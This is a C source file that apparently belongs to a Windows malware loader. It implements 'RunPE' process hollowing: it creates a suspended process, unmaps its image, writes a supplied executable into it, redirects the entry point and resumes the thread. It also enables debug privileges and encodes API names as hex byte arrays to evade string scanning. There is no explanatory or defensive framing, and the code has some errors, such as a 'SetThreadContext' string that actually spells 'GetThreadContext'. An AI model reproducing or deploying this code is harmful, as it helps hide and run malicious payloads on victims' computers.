#include "peutils/runpe.h"

BOOL EnableDebugPrivileges(void)
{
        HANDLE token;
        TOKEN_PRIVILEGES priv;
        BOOL ret = FALSE;

        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
       {
            priv.PrivilegeCount = 1;
            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE)
	     {
                    ret = TRUE;
              }
             CloseHandle(token);
        }
        return ret;
}

HANDLE peutils_runpe( wchar_t *path, wchar_t *cmdline, wchar_t *cwd, void *k32, void *gpa, void *pefile ){

  int i;
  PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PIMAGE_SECTION_HEADER ISH;
	PROCESS_INFORMATION PI;
	STARTUPINFOW SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;
  LPVOID pImageBase;

  /* Functions */
	_NtUnmapViewOfSection __NtUnmapViewOfSection;
  _GetProcAddress __GetProcAddress;
  _CreateProcess __CreateProcess;
  _VirtualAlloc __VirtualAlloc;
  _VirtualAllocEx __VirtualAllocEx;
  _ReadProcessMemory __ReadProcessMemory;
  _WriteProcessMemory __WriteProcessMemory;

  _GetModuleHandle __GetModuleHandle;
  _SetThreadContext __SetThreadContext;
  _GetThreadContext __GetThreadContext;
  _ResumeThread __ResumeThread;
  _TerminateProcess __TerminateProcess;


  /* Functions names */ /* echo "CreateProcessW" | xxd -i */
  char str_ntdll[10] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
  char str_CreateProcessW[15] = {  0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x57, 0x00 };
  char str_VirtualAlloc[13] = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x00 };
  char str_VirtualAllocEx[15] = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x45, 0x78, 0x00 };
  char str_ReadProcessMemory[18] = { 0x52, 0x65, 0x61, 0x64, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x00 };
  char str_WriteProcessMemory[19] = { 0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x00 };

  char str_GetModuleHandle[17] = { 0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x41, 0x00 };

  char str_GetThreadContext[17] = { 0x47, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x00 };
  char str_SetThreadContext[17] = { 0x47, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x00 };
  char str_ResumeThread[13] = { 0x52, 0x65, 0x73, 0x75, 0x6d, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00 };
  char str_TerminateProcess[17] = { 0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x00 };

  char str_NtUnmapViewOfSection[21] = { 0x4e, 0x74, 0x55, 0x6e, 0x6d, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4f, 0x66, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00 };

  __GetProcAddress = (_GetProcAddress)(gpa);
  __CreateProcess = (_CreateProcess) __GetProcAddress( k32, str_CreateProcessW );
  __VirtualAlloc = (_VirtualAlloc) __GetProcAddress( k32, str_VirtualAlloc );
  __VirtualAllocEx = (_VirtualAllocEx) __GetProcAddress( k32, str_VirtualAllocEx );
  __ReadProcessMemory = (_ReadProcessMemory) __GetProcAddress( k32, str_ReadProcessMemory );
  __WriteProcessMemory = (_WriteProcessMemory) __GetProcAddress( k32, str_WriteProcessMemory );

  __GetModuleHandle = (_GetModuleHandle) __GetProcAddress( k32, str_GetModuleHandle );

  __GetThreadContext = (_GetThreadContext) __GetProcAddress( k32, str_GetThreadContext );
  __SetThreadContext = (_SetThreadContext) __GetProcAddress( k32, str_SetThreadContext );
  __ResumeThread = (_ResumeThread) __GetProcAddress( k32, str_ResumeThread );
  __TerminateProcess = (_TerminateProcess) __GetProcAddress( k32, str_TerminateProcess );

  __NtUnmapViewOfSection = (_NtUnmapViewOfSection) __GetProcAddress( __GetModuleHandle( str_ntdll ), str_NtUnmapViewOfSection );

	IDH = (PIMAGE_DOS_HEADER)pefile;
	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		INH = (PIMAGE_NT_HEADERS)(pefile + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE)
		{
			//ZeroMemory(&SI, sizeof(SI));
			//ZeroMemory(&PI, sizeof(PI));
      for(i=0; i<sizeof(SI); i++)
        *(((unsigned char*)&SI)+i) = 0;
      for(i=0; i<sizeof(PI); i++)
        *(((unsigned char*)&PI)+i) = 0;

        if (__CreateProcess(path, cmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, cwd, &SI, &PI))
  			{
  				CTX = (PCONTEXT)__VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE);
  				CTX->ContextFlags = CONTEXT_FULL;
  				if( __GetThreadContext(PI.hThread, CTX) )
  				{
  					__ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Ebx + 8), (LPVOID)&dwImageBase, 4, NULL);
            if ( (DWORD)dwImageBase == INH->OptionalHeader.ImageBase)
  						__NtUnmapViewOfSection(PI.hProcess, (PVOID)dwImageBase);

  					pImageBase = __VirtualAllocEx(PI.hProcess, (LPVOID)INH->OptionalHeader.ImageBase, INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
  					if (pImageBase)
  					{
  						__WriteProcessMemory(PI.hProcess, pImageBase, pefile, INH->OptionalHeader.SizeOfHeaders, NULL);
  						for (i = 0; i < INH->FileHeader.NumberOfSections; i++)
  						{
  							ISH = (PIMAGE_SECTION_HEADER)(pefile + IDH->e_lfanew + 248 + (i * 40));
  							__WriteProcessMemory(PI.hProcess, (LPVOID)(pImageBase + ISH->VirtualAddress), (LPVOID)(pefile + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
  						}
  						__WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Ebx + 8), (LPVOID)(&INH->OptionalHeader.ImageBase), 4, NULL);
  						CTX->Eax = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
  						__SetThreadContext(PI.hThread, (LPCONTEXT)(CTX));
  						__ResumeThread(PI.hThread);
              return PI.hProcess;
  					} else {
              __TerminateProcess( PI.hProcess, -1 );
              return 0;
            }

  				} else {
            __TerminateProcess( PI.hProcess, -1 );
            return 0;
          }
  			}
		}
	}
	//VirtualFree(pFile, 0, MEM_RELEASE);
  return 0;
}

void peutils_runpe_end(){}

__declspec(dllimport) NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE ProcessHandle, LPVOID BaseAddress);


void _RunPE32_64(LPVOID lpFile)
{
	PROCESS_INFORMATION PI = { 0 };
	STARTUPINFOW SI = { 0 };
	CONTEXT CTX = { 0 };
	PROCESS_BASIC_INFORMATION PBI = { 0 };

	CTX.ContextFlags = CONTEXT_FULL;
	WCHAR wPath[MAX_PATH];
	LPVOID lpImageBase;
	LPVOID PEB;
	ULONG RetSize;
	PIMAGE_DOS_HEADER IDH = (PIMAGE_DOS_HEADER)(lpFile);
	PIMAGE_NT_HEADERS INH = (PIMAGE_NT_HEADERS)((DWORD)(lpFile) + IDH->e_lfanew);
	PIMAGE_SECTION_HEADER ISH = IMAGE_FIRST_SECTION(INH);

	if (!GetModuleFileNameW(NULL, wPath, MAX_PATH - 1))
		return;

	if (CreateProcessW(wPath, GetCommandLineW(), NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
	{
		if (GetThreadContext(PI.hThread, &CTX))
		{
			if (!NtUnmapViewOfSection(PI.hProcess, GetModuleHandle(NULL)))
			{
				if (lpImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)INH->OptionalHeader.ImageBase, INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
				{
					if (WriteProcessMemory(PI.hProcess, lpImageBase, lpFile, INH->OptionalHeader.SizeOfHeaders, NULL))
					{
						for (int iSection = 0; iSection < INH->FileHeader.NumberOfSections; iSection++)
						{
#ifndef WIN64
							WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(lpImageBase) + ISH[iSection].VirtualAddress), (LPVOID)((DWORD)(lpFile) + ISH[iSection].PointerToRawData), ISH[iSection].SizeOfRawData, NULL);
#else
							WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD64)(lpImageBase) + ISH[iSection].VirtualAddress), (LPVOID)((DWORD64)(lpFile) + ISH[iSection].PointerToRawData), ISH[iSection].SizeOfRawData, NULL);
#endif
						}

						if (!NtQueryInformationProcess(PI.hProcess, (PROCESSINFOCLASS)0, &PBI, sizeof(PBI), &RetSize))
						{
#ifndef WIN64
              if(WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(PBI.PebBaseAddress) + sizeof(LPVOID) * 2), &lpImageBase, sizeof(LPVOID), NULL))
#else
              if (WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD64)(PBI.PebBaseAddress) + sizeof(LPVOID) * 2), &lpImageBase, sizeof(LPVOID), NULL))
#endif
							{
#ifndef WIN64
								CTX.Eax = (DWORD)lpImageBase + INH->OptionalHeader.AddressOfEntryPoint;
#else
								CTX.Rcx = (DWORD64)lpImageBase + INH->OptionalHeader.AddressOfEntryPoint;
#endif
								if (SetThreadContext(PI.hThread, &CTX))
								{
									if (ResumeThread(PI.hThread))
									{
										CloseHandle(PI.hProcess);
										CloseHandle(PI.hThread);
										VirtualFree(lpFile, 0, MEM_RELEASE);
										return;
									}
								}
							}
					}
				}
			}
		}
		}
	}

  if (PI.hProcess)
  	{
  		TerminateProcess(PI.hProcess, 0);
  		CloseHandle(PI.hProcess);
  	}

  	if (PI.hThread) CloseHandle(PI.hThread);

  	//VirtualFree(lpFile, 0, MEM_RELEASE);

  	return;
}
